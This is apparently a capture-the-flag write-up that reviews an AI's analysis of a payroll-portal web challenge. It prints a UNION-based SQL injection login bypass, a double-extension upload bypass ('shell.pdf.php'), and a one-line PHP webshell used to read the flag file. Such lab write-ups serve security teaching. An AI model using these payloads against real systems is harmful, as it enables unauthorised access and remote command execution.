---
title: "XBEN-029-24 Bobby Payroll"
category: "Web"
taxonomy: "Authentication Bypass"
vulnerability: "SQL Injection + Arbitrary File Upload"
difficulty: "Medium"
---

# AI Analysis

## Objective

Understand how authentication works, determine whether SQL injection can bypass the login flow, and identify whether the file upload functionality can be abused to gain code execution and retrieve the flag.

## Context

The application simulates an HR payroll portal with a login form and an authenticated dashboard containing a file upload feature.

The challenge description suggests:

- Boolean-based Blind SQL Injection
- Arbitrary File Upload after authentication
- Uploading a WebShell to read `FLAG.txt`

The first assumption is that a classic SQL injection directly bypasses authentication. However, this needs verification because authentication logic may involve multiple steps.

## Prompt

Analyze the login process and determine whether SQL injection can bypass authentication. Also determine whether the upload functionality can be abused to execute arbitrary code.

## AI Output

Initial assumptions suggested a direct login bypass using:

```sql
admin' OR '1'='1' -- -
```

However, testing showed this approach only triggered:

```text
Invalid password
```

Reviewing the application logic revealed that authentication occurs in two separate stages:

1. Query user existence:

```sql
SELECT username
FROM users
WHERE username='$realusername'
```

2. Verify password:

```sql
SELECT user_id
FROM users
WHERE username='$usernamenew'
AND password=...
```

A direct SQLi against the first query alone does not bypass the second check.

A working approach used SQL injection with `UNION SELECT` to manipulate the value returned by the first query:

```sql
xxxxx' UNION SELECT "' OR 1=1 #" -- -
```

This payload injects a malicious value into the second query and bypasses password validation.

After authentication, the upload page restricts uploads through client-side validation:

```javascript
/(\.pdf)$/i
```

However, server-side validation only checks:

```php
strpos($fileName,'.pdf') !== false
```

The upload restriction can therefore be bypassed by directly sending a request containing:

```text
shell.pdf.php
```

The uploaded file executes arbitrary PHP code:

```php
<?php system($_GET['cmd']); ?>
```

Allowing retrieval of the flag:

```text
cat /FLAG.txt
```

## Evaluation

### Correct Aspects

- Authentication flow required deeper inspection.
- SQL injection existed.
- Upload functionality was vulnerable.
- Client-side validation alone was insufficient.

### Incorrect or Misleading Aspects

- Initial assumption: classic `' OR 1=1` authentication bypass.
- Initial assumption: Blind SQLi alone was enough.
- Initial assumption: upload restrictions only relied on filename extension.

### Missing Reasoning

The key missing step was understanding the application's authentication workflow:

- First query validates user existence.
- Second query validates password.
- Injection had to influence both stages indirectly.

The upload process also required distinguishing:

- Client-side validation
- Server-side validation

## Impact on Analysis

- Helped identify actual authentication logic.
- Revealed assumptions that initially caused incorrect payloads.
- Demonstrated that examining application flow matters more than trying generic payloads.

## Conclusion

The interaction was useful after moving beyond standard SQL injection assumptions.

The challenge was not solved through a simple login bypass. Instead, exploitation required:

1. Understanding the multi-step authentication logic.
2. Manipulating query results through SQL injection.
3. Bypassing weak upload restrictions.
4. Achieving remote command execution using a WebShell.

The most important lesson is that understanding application logic is more valuable than relying on generic payloads.
